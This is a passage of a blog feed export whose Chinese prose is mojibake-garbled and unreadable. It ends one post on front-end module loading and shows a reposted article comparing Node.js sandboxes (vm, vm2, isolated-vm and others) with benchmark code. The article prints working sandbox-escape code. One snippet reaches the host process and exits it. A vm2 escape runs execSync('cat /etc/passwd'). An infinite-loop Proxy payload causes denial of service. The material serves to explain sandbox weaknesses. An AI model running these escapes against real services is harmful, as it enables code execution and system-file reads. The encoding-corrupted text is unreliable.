å¤©é©¬ç‹¬æœ‰çš„è¿™å¥— seed ä¾èµ–å…³ç³»æœºåˆ¶ï¼Œå› ä¸ºæ²¡æœ‰åƒ webpack é‚£æ ·æŠŠä¾èµ–å…³ç³»éšè—èµ·æ¥ï¼Œè¿˜æ˜¯æœ‰ä¸€å®šçš„å­¦ä¹ æˆæœ¬çš„ï¼Œå¹¶ä¸”ä¹Ÿå®¹æ˜“é€ æˆä¸€äº›é—®é¢˜ï¼ˆå½“ç„¶ webpack ä¹Ÿæœ‰ä»–è‡ªå·±çš„å¤æ‚å’Œå­¦ä¹ æˆæœ¬ ï¼‰ã€‚ æ‰€ä»¥é‚£äº›é¡µé¢é‡ä¸å¤§ï¼Œä¸”æ²¡æœ‰æ·˜ç³»è¿™æ ·ç›¸å¯¹æ¯”è¾ƒå˜æ€çš„æ›´æ–°è¯‰æ±‚ä¸‹ï¼Œå› ä¸ºæ¨¡å—æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæ ‡å‡†çš„ npm åŒ…ï¼Œå¤©é©¬ä¹Ÿæ”¯æŒäº†ç¦»çº¿æ„å»ºçš„æ–¹å¼ï¼Œè¿™ä¸ªæ–¹æ¡ˆå°±æ›´è´´è¿‘ react æºç appçš„å¼€å‘ï¼Œå¯ä»¥åšæ›´å¤šçš„æ„å»ºæ—¶çš„ä¼˜åŒ–ï¼ŒåŒæ—¶äº§ç‰©ä¹Ÿè„±ç¦»äº† seed ä½“ç³»ï¼Œæ¸²æŸ“è¿‡ç¨‹å¾—åˆ°äº†ç®€åŒ–ã€‚ é•¿æœŸæ¥è¯´ï¼Œéšç€ webpack æœ¬èº«çš„å‘å±•ï¼Œæœ€ç»ˆè¿˜æ˜¯æœŸæœ›èƒ½å¤Ÿé€æ¸åˆå¹¶åˆ°ç¤¾åŒºæ–¹æ¡ˆä¸Šï¼Œåœ¨é¡µé¢æ„å»ºå’ŒåŠ¨æ€åŒ–èƒ½åŠ›ä¹‹é—´è¾¾åˆ°ä¸€ä¸ªç§‘å­¦çš„å¹³è¡¡ã€‚ åŠ¨æ€åŒ– è€Œå¯¹äºæ·˜ç³»è‡ªå·±æ¥è¯´ï¼ŒåŠ¨æ€åŒ–å§‹ç»ˆæ˜¯ä¸€ä¸ªé‡è¦çš„èƒ½åŠ›ï¼Œæˆ‘è‡ªå·±çš„è®¾æƒ³æ˜¯ï¼Œå¦‚æœä»Šå¤©æˆ‘ä»¬å¯ä»¥ä¸ç”¨æ‰“åŒ…æ¨¡å—ï¼Œç›´æ¥æŠŠæºæ–‡ä»¶å‘å¸ƒåˆ° CDNï¼ŒæŠŠ CDN å½“åšç›®å½•ï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸Šè·‘ä¸€ä¸ªç±»ä¼¼ webpack çš„èƒ½åŠ›ï¼Œå°±å¯ä»¥åœ¨ä¿ç•™åŠ¨æ€æ€§çš„åŒæ—¶ï¼Œä¹Ÿä¸ä¼šå¸¦æ¥é¢å¤–çš„å¤æ‚åº¦ï¼ˆå¤æ‚åº¦éƒ½åœ¨æ–¹æ¡ˆæœ¬èº«äº†ï¼Œå¯¹å¼€å‘è€…æ¥è¯´ï¼Œå°±ä¸éœ€è¦äº†è§£å¤ªå¤šï¼‰ã€‚ ä¸ºä»€ä¹ˆè¿™åªæ˜¯ä¸€ä¸ªå±•æœ›å‘¢ï¼Œè¦è¿™ä¹ˆåšï¼Œè¿˜æ˜¯éœ€è¦é¢ä¸´ä¸€äº›é—®é¢˜ï¼š æµè§ˆå™¨çš„æ€§èƒ½æ˜¯å¦è¶³å¤Ÿåšè¿™æ ·çš„ç¼–è¯‘ï¼Œç‰¹åˆ«æ˜¯ç›®å‰åœ¨ webpack æœ¬èº«ç¼–è¯‘å°±æ˜¯ä¸€ä»¶è€—æ—¶çš„äº‹æƒ…ï¼ŒæŠŠè¿™éƒ¨åˆ†æ—¶é—´æ‰”ç»™ç”¨æˆ·ä¾§è¿˜æ˜¯æœ‰ç‚¹å¯æ€•çš„ã€‚ è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿåœ¨ç½‘ç»œä¸Šçš„æ—¶é—´æ¶ˆè€—ï¼Œè™½ç„¶å¯ä»¥è®¾è®¡å¾ˆå¤šç¼“å­˜æœºåˆ¶ï¼Œä½†æ˜¯é¦–æ¬¡ä¾ç„¶æ˜¯ä¸ªé—®é¢˜ï¼Œå¹¶ä¸”ç»•å¼€æµè§ˆå™¨æœ¬èº«çš„ç¼“å­˜æœºåˆ¶ï¼Œåšä¸€å¥—æ–‡ä»¶ç¼“å­˜è¿˜æ˜¯ä¼šæœ‰å¾ˆå¤šé—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨æ— çº¿ç«¯ app webview å†…ï¼Œç©ºé—´æ˜¯éå¸¸æœ‰é™çš„ã€‚ åŒ…ç®¡ç†çš„å¤æ‚åº¦ï¼Œå½“å‰çš„ seed æœºåˆ¶å·²ç»åšäº†ç±»ä¼¼çš„äº‹æƒ…ï¼Œä¸ä¼šå¸¦æ¥å¤ªå¤šåŒ…ç®¡ç†æ–¹å¼ä¸Šçš„å˜åŒ–ã€‚]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•è®©ä¸å—ä¿¡ä»»ä»£ç â€œå®‰å…¨â€è¿è¡Œï¼Ÿ]]></title>
    <url>%2F2020%2F06%2F23%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%A6%82%E4%BD%95%E8%AE%A9%E4%B8%8D%E5%8F%97%E4%BF%A1%E4%BB%BB%E4%BB%A3%E7%A0%81%E2%80%9C%E5%AE%89%E5%85%A8%E2%80%9D%E8%BF%90%E8%A1%8C%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5f02cd47e51d453488380f15?utm_source=gold_browser_extension æˆ‘ä»¬åœ¨ imgcook æ™ºèƒ½ç”Ÿæˆä»£ç è¿‡ç¨‹ä¸­ï¼Œå¸Œæœ›æä¾›ä¸€äº›è‡ªå®šä¹‰çš„èƒ½åŠ›ï¼Œæ¯”å¦‚è‡ªå®šä¹‰ DSLã€è‡ªå®šä¹‰é€»è¾‘ç‚¹è¯†åˆ«/è¡¨è¾¾ï¼Œèƒ½å¤Ÿè®©å¼€å‘è€…æŒ‰ç…§å®˜æ–¹æä¾›çš„æ ‡å‡†åè®®æ•°æ®ï¼Œåœ¨å¯æ§èŒƒå›´å’Œæƒé™å†…è‡ªå®šä¹‰ç”Ÿæˆè‡ªå·±æ‰€éœ€è¦çš„ä»£ç ï¼Œä¹Ÿä¸ç”¨å±€é™å®˜æ–¹æä¾›çš„ä»£ç ç”Ÿæˆæ¨¡æ¿ï¼Œæ‰©å±•è‡ªå®šä¹‰é€»è¾‘è¯†åˆ«èƒ½åŠ›/è¡¨è¾¾èƒ½åŠ›ï¼Œç”Ÿæˆå®šä¹‰çš„é€»è¾‘ä»£ç ï¼Œæ»¡è¶³å¼€å‘è€…è‡ªå®šä¹‰ä¸šåŠ¡å¤šæ ·åŒ–çš„éœ€æ±‚ã€‚ é‚£ä¹ˆï¼Œè¿™äº›è‡ªå®šä¹‰èƒ½åŠ›çš„è„šæœ¬éœ€è¦è¿è¡Œåœ¨ä¸€ä¸ªæ²™ç®±å®¹å™¨ï¼ŒåŒæ—¶è€ƒè™‘åˆ°è¿è¡Œç¯å¢ƒç»Ÿä¸€ä»¥åŠéœ€åŠ è½½ Node æ¨¡å—èƒ½åŠ›ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡ç«¯æ„å»ºè„šæœ¬è¿è¡Œæ²™ç®±å®¹å™¨ï¼Œè¿™æ ·å®‰å…¨å°±æ›´ä¸ºé‡è¦ï¼ˆå¼€å‘è€…çš„è„šæœ¬å¿…é¡»ä¸¥æ ¼å—åˆ°é™åˆ¶ä¸éš”ç¦»ï¼Œä¸èƒ½å½±å“åˆ°å®¿ä¸»ç¨‹åºï¼Œä¹Ÿä¸èƒ½å½±å“ç”¨æˆ·ä½¿ç”¨ï¼‰ï¼Œè·Ÿè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼ˆç”¨æˆ·çš„ï¼‰åº”ç”¨ä¸åŒï¼Œå®¢æˆ·ç«¯è¿è¡Œåªä¼šå½±å“ä»–è‡ªå·±ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬è°ƒç ”&amp;æ¢ç´¢å¦‚ä½•é€‰æ‹©/æ„å»ºä¸€ä¸ªä¸º Node.js åº”ç”¨æ›´å®‰å…¨çš„æ²™ç®±æ¨¡å—ã€‚ æ²™ç®±æ˜¯ä»€ä¹ˆï¼Ÿå…ˆä»‹ç»ä¸‹æ²™ç®±æŠ€æœ¯ï¼Œæ˜¯ä¸€ä¸ªè™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼Œå…è®¸ä½ åœ¨æ²™ç®±ç¯å¢ƒä¸­å…è®¸æµè§ˆå™¨æˆ–è€…å…¶ä»–ç¨‹åºï¼Œå› æ­¤è¿è¡Œæ‰€äº§ç”Ÿçš„å˜åŒ–å¯ä»¥éšååˆ é™¤ã€‚å®ƒåˆ›é€ äº†ä¸€ä¸ªç±»ä¼¼æ²™ç›’çš„ç‹¬ç«‹ä½œä¸šç¯å¢ƒï¼Œåœ¨å…¶å†…éƒ¨è¿è¡Œçš„ç¨‹åºå¹¶ä¸èƒ½å¯¹ç¡¬ç›˜äº§ç”Ÿæ°¸ä¹…æ€§çš„å½±å“ï¼Œå…¶æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿç¯å¢ƒï¼Œå¯ç”¨æ¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºæˆ–ä¸Šç½‘è¡Œä¸ºã€‚ æ²™ç®±æ˜¯ä¸€ç§è™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼Œæ²™ç®±æä¾›çš„ç¯å¢ƒç›¸å¯¹æ¯ä¸€ä¸ªè¿è¡Œçš„ç¨‹åºéƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œè€Œä¸ä¼šå¯¹ç°æœ‰çš„ç³»ç»Ÿäº§ç”Ÿå½±å“ã€‚ Node.js æ²™ç®±æ¨¡å—åˆ†æä¸‹é¢æˆ‘ä»¬ä»‹ç»ä¸‹ä¹‹å‰è°ƒç ”è¿‡çš„ä¸€äº› Node.js çš„æ²™ç®±ã€‚ æ¨¡å—(module) å®‰å…¨(Secure) å†…å­˜é™åˆ¶(Memory Limits) æ˜¯å¦éš”ç¦»(Isolated) å¤šçº¿ç¨‹(Multithreaded) æ¨¡å—æ”¯æŒ(Module Support) æ£€æŸ¥å™¨æ”¯æŒï¼ˆInspector Supportï¼‰ vm âœ… âœ… worker_threads âœ… âœ… âœ… vm2 âœ… âœ… âœ… napajs âœ… âœ… Partial webworker-threads âœ… tiny-worker âœ… âœ… âœ… âœ… isolated-vm âœ… âœ… âœ… âœ… jailed âœ… âœ… safeify âœ… âœ… âœ… âœ… vm: åªæ˜¯æ”¹å˜äº†è¿è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥å®˜ç½‘è¯´æ˜¯ä¸èƒ½ç”¨äºæ‰§è¡Œä¸å®‰å…¨çš„ä»£ç  vm2: åšäº†ä¸€äº›ç®€å•çš„è¦†ç›–ï¼Œæå‡äº†å®‰å…¨æ€§ï¼Œå› ä¸ºå…¬ç”¨åŒä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥ loader ç›¸åŒï¼Œå­˜åœ¨å¯¹å…¨å±€æ¨¡å—çš„ä¿®æ”¹é—®é¢˜ webworker-threads: æ—©æœŸçš„ç¤¾åŒºå®ç°ï¼Œæ— æ³• require worker_threads: å®˜æ–¹å®ç°çš„å¤šçº¿ç¨‹ï¼Œçº¿ç¨‹é—´çš„ç¡®æ˜¯éš”ç¦»çš„ï¼Œä½†æ˜¯æ— æ³•å¯¹ io æ“ä½œè¿›è¡Œé™åˆ¶ tiny-worker: å¯¹ä¸Šé¢çš„ä¸€ä¸ªåŒ…è£… Napa.js: å¾®è½¯å¼€æºé¡¹ç›®ï¼Œå¹¶è¡Œè®¡ç®—ç¯å¢ƒï¼Œä¸€ä¸ªåŸºäº V8 çš„å¤šçº¿ç¨‹ JavaScript è¿è¡Œæ—¶ï¼Œè¯¥è¿è¡Œæ—¶æœ€åˆæ—¨åœ¨å¼€å‘é«˜åº¦è¿­ä»£çš„æœåŠ¡ï¼Œå¹¶åœ¨ Bing ä¸­å…·æœ‰å‡ºè‰²çš„æ€§èƒ½ã€‚ isolated-vm: nodejs çš„åº“ï¼Œå¯è®©æ‚¨è®¿é—® v8 çš„ Isolate æ¥å£ã€‚ è¿™æ ·ï¼Œä½ å°±å¯ä»¥åˆ›å»ºå½¼æ­¤å®Œå…¨éš”ç¦»çš„JavaScriptç¯å¢ƒã€‚ å¦‚æœæ‚¨éœ€è¦ä»¥å®‰å…¨çš„æ–¹å¼è¿è¡Œä¸€äº›ä¸å—ä¿¡ä»»çš„ä»£ç ï¼Œåˆ™å¯èƒ½ä¼šå‘ç°æ­¤æ¨¡å—å¾ˆæœ‰ç”¨ã€‚ å¦‚æœæ‚¨éœ€è¦åœ¨å¤šä¸ªçº¿ç¨‹ä¸­åŒæ—¶è¿è¡Œä¸€äº›JavaScriptï¼Œæ‚¨å¯èƒ½è¿˜ä¼šå‘ç°æ­¤æ¨¡å—å¾ˆæœ‰ç”¨ã€‚ å¦‚æœæ‚¨éœ€è¦åŒæ—¶è¿›è¡Œè¿™ä¸¤ä¸ªé¡¹ç›®ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½ä¼šå‘ç°æ­¤é¡¹ç›®éå¸¸æœ‰ç”¨ï¼ Jailedï¼šä¸€ä¸ªå°å‹JavaScriptåº“ï¼Œç”¨äºåœ¨æ²™ç®±ä¸­è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚ è¯¥åº“æ˜¯ç”¨ vanilla-js ç¼–å†™çš„ï¼Œæ²¡æœ‰ä»»ä½•ä¾èµ–å…³ç³»ã€‚ safeifyï¼šä¸ºå°†è¦æ‰§è¡Œçš„åŠ¨æ€ä»£ç å»ºç«‹ä¸“é—¨çš„è¿›ç¨‹æ± ï¼Œä¸å®¿ä¸»åº”ç”¨ç¨‹åºåˆ†ç¦»åœ¨ä¸åŒçš„è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œæ”¯æŒé…ç½®æ²™ç®±è¿›ç¨‹æ± çš„æœ€å¤§è¿›ç¨‹æ•°é‡ï¼Œæ”¯æŒé™å®šåŒæ­¥ä»£ç çš„æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒé™å®šåŒ…æ‹¬å¼‚æ­¥ä»£ç åœ¨å†…çš„æ‰§è¡Œæ—¶é—´ï¼Œæ”¯æŒé™å®šæ²™ç®±è¿›ç¨‹æ± çš„æ•´ä½“çš„ CPU èµ„æºé…é¢ï¼Œæ”¯æŒé™å®šæ²™ç®±è¿›ç¨‹æ± çš„æ•´ä½“çš„æœ€å¤§çš„å†…å­˜é™åˆ¶ã€‚ æœç´¢ Node.js æ²™ç®±ï¼Œå‡ºç°çš„æ˜¯ Node.js æä¾› vm å†…å»ºæ¨¡å—ï¼Œæˆ‘ä»¬çœ‹ä¸‹ vm æ¨¡å—ã€‚ Node.js vmvm æ˜¯ Node.js é»˜è®¤æä¾›çš„ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ— API ç”¨äºåœ¨ V8 è™šæ‹Ÿæœºç¯å¢ƒä¸­ç¼–è¯‘å’Œè¿è¡Œä»£ç ã€‚ A common use case is to run the code in a different V8 Context. This means invoked code has a different global object than the invoking code. One can provide the context by contextifying an object. The invoked code treats any property in the context like a global variable. Any changes to global variables caused by the invoked code are reflected in the context object. ä¸€ä¸ªå¸¸è§çš„ç”¨ä¾‹æ˜¯åœ¨ä¸åŒçš„ V8 ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»£ç ã€‚ è¿™æ„å‘³ç€è¢«è°ƒç”¨çš„ä»£ç ä¸è°ƒç”¨çš„ä»£ç å…·æœ‰ä¸åŒçš„å…¨å±€å¯¹è±¡ã€‚ å¯ä»¥é€šè¿‡ä½¿å¯¹è±¡ä¸Šä¸‹æ–‡éš”ç¦»åŒ–æ¥æä¾›ä¸Šä¸‹æ–‡ã€‚ è¢«è°ƒç”¨çš„ä»£ç å°†ä¸Šä¸‹æ–‡ä¸­çš„ä»»ä½•å±æ€§éƒ½è§†ä¸ºå…¨å±€å˜é‡ã€‚ ç”±è°ƒç”¨çš„ä»£ç å¼•èµ·çš„å¯¹å…¨å±€å˜é‡çš„ä»»ä½•æ›´æ”¹éƒ½å°†ä¼šåæ˜ åœ¨ä¸Šä¸‹æ–‡å¯¹è±¡ä¸­ã€‚ The vm module enables compiling and running code within V8 Virtual Machine contexts. The vm module is not a security mechanism. Do not use it to run untrusted code. vm æ¨¡å—å¯åœ¨ V8 è™šæ‹Ÿæœºä¸Šä¸‹æ–‡ä¸­ç¼–è¯‘å’Œè¿è¡Œä»£ç ã€‚ vm æ¨¡å—ä¸æ˜¯å®‰å…¨çš„æœºåˆ¶ã€‚ ä¸è¦ä½¿ç”¨å®ƒæ¥è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚ vm å°½ç®¡éš”ç¦»äº†ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä½†ä¾ç„¶å¯ä»¥è®¿é—®æ ‡å‡†çš„ Javascript API å’Œå…¨å±€çš„ Node.js ç¯å¢ƒã€‚ æ‰€ä»¥ vm å¹¶ä¸æ˜¯å®‰å…¨çš„ã€‚ çœ‹ä¸ªä¾‹å­ï¼š 1234&quot;use strict&quot;;const vm = require(&apos;vm&apos;);const result = vm.runInNewContext(`process`);console.log(result);å¤åˆ¶ä»£ç  ç»“æœ: ![image.png](data:image/svg+xml;utf8,) â€œprocess is not definedâ€ï¼Œé»˜è®¤æƒ…å†µä¸‹VMæ¨¡å—ä¸èƒ½è®¿é—®è¿›ç¨‹ï¼Œå¦‚æœæƒ³è¦è®¿é—®éœ€è¦æŒ‡å®šæˆæƒã€‚ çœ‹èµ·æ¥é»˜è®¤ä¸èƒ½è®¿é—® â€œprocessã€requireâ€ ç­‰å°±æ»¡è¶³éœ€æ±‚äº†ï¼Œä½†æ˜¯çœŸçš„æ²¡æœ‰åŠæ³•è§¦åŠä¸»è¿›ç¨‹å¹¶æ‰§è¡Œä»£ç äº†ï¼Ÿ çœ‹ä¸‹é¢è¿™æ®µä»£ç  1234567&quot;use strict&quot;;const vm = require(&apos;vm&apos;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&apos;return process&apos;)().exit()&quot;);const context = vm.createContext(sandbox);script.runInContext(context);console.log(&quot;Hello World!&quot;);å¤åˆ¶ä»£ç  åœ¨ javascript ä¸­ this æŒ‡å‘å®ƒæ‰€å±çš„å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å®ƒæ—¶å°±å·²ç»æŒ‡å‘äº†ä¸€ä¸ª vm ä¸Šä¸‹æ–‡ä¹‹å¤–çš„å¯¹è±¡ã€‚ é‚£ä¹ˆè®¿é—®thisçš„ constructor å°±è¿”å› Object Constructor ï¼Œè®¿é—® Object Constructor çš„ .constructor è¿”å›Function constructor ã€‚ Function constructor å°±åƒ javascript æä¾›çš„æœ€é«˜å‡½æ•°ï¼Œä»–å¯ä»¥è®¿é—®å…¨å±€ï¼Œæ‰€ä»¥ä»–èƒ½è¿”å›å…¨å±€äº‹ç‰©ã€‚ Function constructor å…è®¸ä»å­—ç¬¦ä¸²ç”Ÿæˆå‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ å¯ä»¥çœ‹å‡ºè¿™æ®µä»£ç çš„ Hello World! æ°¸è¿œä¸ä¼šè¾“å‡ºã€‚ ä¼¼ä¹éš”ç¦»äº†ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä½†å®é™…ä¸Šå¾ˆå®¹æ˜“é€ƒé€¸å‡ºå»ã€‚ å› ä¸º Node.js é»˜è®¤å†…å»ºæ¨¡å— vm æœ‰ç¼ºé™·ï¼Œæ‰€ä»¥å°±æœ‰äº† vm2ã€jailedã€napajsã€‚ä¸‹é¢çœ‹ä¸‹ vm2 æ¨¡å—ã€‚ Node.js vm2vm2 åŸºäº vmï¼Œä½¿ç”¨å®˜æ–¹çš„ vm åº“æ„å»ºæ²™ç®±ç¯å¢ƒã€‚ä½¿ç”¨ JavaScript çš„ Proxy æŠ€æœ¯æ¥é˜²æ­¢æ²™ç®±è„šæœ¬é€ƒé€¸ã€‚æŒ‡å®šç™½åå• Node çš„å†…ç½®æ¨¡å—ä¸€èµ·è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚å®‰å…¨åœ°ï¼ä»… JavaScript å†…ç½®å¯¹è±¡å’Œ Buffer å¯ç”¨ã€‚é»˜è®¤ä¸‹è°ƒåº¦å‡½æ•°ï¼ˆsetIntervalï¼ŒsetTimeout å’Œ setImmediateï¼‰é»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨ã€‚ vm2 ç‰¹æ€§ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ç‰¹æ€§ï¼š è¿è¡Œä¸å—ä¿¡ä»»çš„ javascript è„šæœ¬ æ²™ç®±çš„ç»ˆç«¯è¾“å‡ºä¿¡æ¯å®Œå…¨å¯æ§ æ²™ç®±å†…å¯ä»¥å—é™åœ°åŠ è½½ modules å¯ä»¥å®‰å…¨åœ°å‘æ²™ç®±é—´ä¼ é€’ callback æ­»å¾ªç¯æ”»å‡»å…ç–« while (true) {} vm2 å·¥ä½œåŸç†vm2 å†…éƒ¨ä½¿ç”¨ vm æ¨¡å—åˆ›å»ºå®‰å…¨(ä¸Šä¸‹æ–‡)å®ƒä½¿ç”¨ä»£ç†æ¥é˜²æ­¢é€ƒé€¸æ²™ç®± ç°åœ¨ï¼Œä» vm contenxt åˆ°æ²™ç®±çš„æ‰€æœ‰å†…å®¹éƒ½å¯ä»¥ç”¨æ¥è¿›è¡Œå¤„ç†ã€‚ 123&quot;use strict&quot;;const &#123;VM&#125; = require(&apos;vm2&apos;);new VM().run(&apos;this.constructor.constructor(&quot;return process&quot;)())&apos;);å¤åˆ¶ä»£ç  æŠ›å‡ºå¼‚å¸¸é”™è¯¯ï¼Œprocess æœªå®šä¹‰ã€‚ é€ƒé€¸ ç”±äº VM2 å°† VM ä¸Šä¸‹æ–‡ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½ä¸Šä¸‹æ–‡åŒ–ï¼Œå› æ­¤ this å…³é”®å­—ä¸å†å…·æœ‰å¯¹ constructor å±æ€§çš„è®¿é—®æƒï¼Œå› æ­¤æˆ‘ä»¬ä¹‹å‰çš„æœ‰æ•ˆè´Ÿè½½å·²å¤±æ•ˆã€‚ å¯¹äºç»•è¿‡ï¼Œæˆ‘ä»¬å°†éœ€è¦æ²™ç®±ä¹‹å¤–çš„å†…å®¹ï¼Œä»¥ä¾¿å®ƒä¸ä»…é™äºæ²™ç®±ä¸Šä¸‹æ–‡ï¼Œè€Œä¸”å¯ä»¥å†æ¬¡è®¿é—®æ„é€ å‡½æ•°ã€‚ ç°åœ¨ï¼Œvm å†…éƒ¨çš„æ‰€æœ‰å¯¹è±¡éƒ½å·²é™åˆ¶äº†ï¼Œæˆ‘ä»¬ä»¥æŸç§æ–¹å¼éœ€è¦å¤–éƒ¨çš„ä¸€äº›ä¸œè¥¿æ¥çˆ¬å›è¿›ç¨‹ï¼Œç„¶åæ‰§è¡Œä»£ç ã€‚ å¦‚æœæˆ‘ä»¬åœ¨ try å—ä¸­ç¼–å†™é”™è¯¯ä»£ç ï¼Œè¿™å°†ä¼šå¯¼è‡´å®¿ä¸»è¿›ç¨‹æŠ›å‡ºå¼‚å¸¸ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡ catch å°†å®¿ä¸»è¿›ç¨‹çš„å¼‚å¸¸æ•è·å› vmï¼Œç„¶åä½¿ç”¨è¯¥å¼‚å¸¸è¿›è¡Œå¤„ç†ã€‚è¿™å¾ˆå¯èƒ½å°±æ˜¯æˆ‘ä»¬è¦åšçš„ 123456789101112131415// vm2 å°†è¯¥æ¼æ´å·²ä¿®å¤const &#123;NodeVM&#125; = require(&apos;vm2&apos;); nvm = new NodeVM()nvm.run(` try &#123; this.process.removeListener(); &#125; catch (host_exception) &#123; console.log(&apos;host exception: &apos; + host_exception.toString()); host_constructor = host_exception.constructor.constructor; host_process = host_constructor(&apos;return this&apos;)().process; child_process = host_process.mainModule.require(&quot;child_process&quot;); console.log(child_process.execSync(&quot;cat /etc/passwd&quot;).toString()); &#125;`);å¤åˆ¶ä»£ç  åœ¨ try å—ä¸­ï¼Œæˆ‘ä»¬å°è¯•åˆ é™¤æ­£åœ¨æ‰§è¡Œæ­¤æ“ä½œçš„å½“å‰è¿›ç¨‹ä¸Šçš„ä¾¦å¬å™¨ - this.process.removeListener() è¿™ä¼šå¼•èµ·ä¸»æœºå¼‚å¸¸ã€‚ç”±äºæ¥è‡ªå®¿ä¸»è¿›ç¨‹çš„å¼‚å¸¸ä¸ä¼šåœ¨ä¼ é€’åˆ°æ²™ç®±ä¹‹å‰è¢«å…³è”ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å¼‚å¸¸çˆ¬å‡åˆ°æ‰€éœ€çš„æ ‘åˆ°requireã€‚ æ¯•ç«Ÿï¼Œvm2 ä¸­è¿˜æœ‰æ›´å¤šæ–°çš„åˆ›é€ æ€§çš„ç»•è¿‡ - æ›´å¤šçš„é€ƒé€¸ é™¤äº†æ²™ç®±é€ƒé€¸ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨infinite while loopæ–¹æ³•åˆ›å»ºæ— é™å¾ªç¯æ‹’ç»æœåŠ¡ 12345678910const &#123;VM&#125; = require(&apos;vm2&apos;);new VM(&#123;timeout:1&#125;).run(` function main()&#123; while(1)&#123;&#125; &#125; new Proxy(&#123;&#125;, &#123; getPrototypeOf(t)&#123; global.main(); &#125; &#125;)`);å¤åˆ¶ä»£ç  æ€§èƒ½å¯¹æ¯” æ²™ç®±æœºåˆ¶å¯¹äºæ€§èƒ½å½±å“è¿˜æ˜¯æŒºå¤§çš„ è‡ªå¢æ¬¡æ•° normal vm vm2 jailed isolated-vm 1000 0.042ms 1179.227ms 354.053ms 12.246ms 24.303ms 10000 0.368ms 9404.247ms 2107.150ms 121.993ms 242.625ms 100000 11.375ms 128843.386ms 17624.867ms 1058.524ms 1155.492ms æµ‹è¯•ä»£ç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485const vm = require(&apos;vm&apos;);const &#123; VM &#125; = require(&apos;vm2&apos;);const jailed = require(&apos;jailed&apos;);const path = &apos;./plugin.js&apos;;var api = &#123; log: console.log&#125;;let plugin = new jailed.Plugin(path, api);var reportResult = function(result) &#123; // console.log(&quot;Result is: &quot; + result);&#125;;let a = 0;const vm2 = new VM(&#123; timeout: 1000, sandbox: &#123; a: a &#125;&#125;);const count = 100000;// normalconsole.time(&apos;normal&apos;);for (let i = 0; i &lt; count; ++i) &#123; a += 1;&#125;console.timeEnd(&apos;normal&apos;);// vmconsole.time(&apos;vm&apos;);for (let i = 0; i &lt; count; ++i) &#123; vm.runInNewContext(&apos;a += 1&apos;, &#123; a: a &#125;);&#125;console.timeEnd(&apos;vm&apos;);// vm2 timerconsole.time(&apos;vm2&apos;);for (let i = 0; i &lt; count; ++i) &#123; vm2.run(&apos;a += 1&apos;);&#125;console.timeEnd(&apos;vm2&apos;);// jailedplugin.whenConnected(() =&gt; &#123; console.time(&apos;jailed&apos;); for (let i = 0; i &lt; count; ++i) &#123; plugin.remote.square(2, reportResult); &#125; console.timeEnd(&apos;jailed&apos;); plugin.disconnect();&#125;);console.time(&apos;isolated-vm&apos;);// isolated-vm// åˆ›å»ºä¸€ä¸ªå†…å­˜é™åˆ¶ 128MB çš„éš”ç¦»è™šæ‹Ÿæœºconst ivm = require(&apos;isolated-vm&apos;);const isolate = new ivm.Isolate(&#123; memoryLimit: 128&#125;);// æ¯ä¸ªéš”ç¦»è™šæ‹Ÿæœºçš„ä¸Šä¸‹æ–‡ç›¸äº’éš”ç¦»const context = isolate.createContextSync();// è§£é™¤ global çš„å¼•ç”¨ï¼Œä¼ é€’ç»™ä¸Šä¸€æ­¥åˆ›å»ºçš„ä¸Šä¸‹æ–‡context.global.setSync(&apos;global&apos;, context.global.derefInto());// åœ¨ä¸Šè¿°ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶è§£æ„ç»“æœfor (let i = 0; i &lt; count; ++i) &#123; const &#123; result &#125; = context.evalSync(`(() =&gt; &quot;Hello world&quot;)()`); // console.log(result);&#125;// &gt; hello world// console.log(result);console.timeEnd(&apos;isolated-vm&apos;);å¤åˆ¶ä»£ç  æœ€åè¿è¡Œä¸ä¿¡ä»»çš„ä»£ç 